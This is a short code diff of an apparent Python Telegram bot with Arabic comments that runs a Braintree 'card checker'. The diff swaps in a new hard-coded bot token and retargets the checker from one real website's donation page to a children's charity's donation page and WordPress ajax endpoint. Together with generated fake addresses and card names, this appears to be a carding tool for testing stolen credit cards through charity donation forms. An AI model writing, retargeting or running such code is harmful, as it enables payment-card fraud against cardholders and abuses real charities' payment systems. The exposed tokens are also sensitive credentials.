@@ -215,7 +215,7 @@ address = random_address()
 card_name = random_card_name()
 
 # توكن البوت
-token = "8787566674:AAHu_bF_LqXZolj_2j1iMQMC1onMst8dgrE"
+token = "8520709238:AAFf1psOsYuulYR2goGOYEObBunbd42mlrA"
 bot = telebot.TeleBot(token, parse_mode="HTML")
 
 # ايدي حسابك
@@ -357,9 +357,9 @@ def UniversalBraintreeChecker(ccx):
         yy = yy.split("20")[1]
     
     pipo = requests.session()		
-    url = 'https://www.dogsblog.com/donate/'
+    url = 'https://beingkid.org/donations/sponsorship-opportunities-for-classes-events/'
     
-    url_1 ='https://www.dogsblog.com/wp-admin/admin-ajax.php'
+    url_1 ='https://beingkid.org/wp-admin/admin-ajax.php'
     headers = {
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
     }
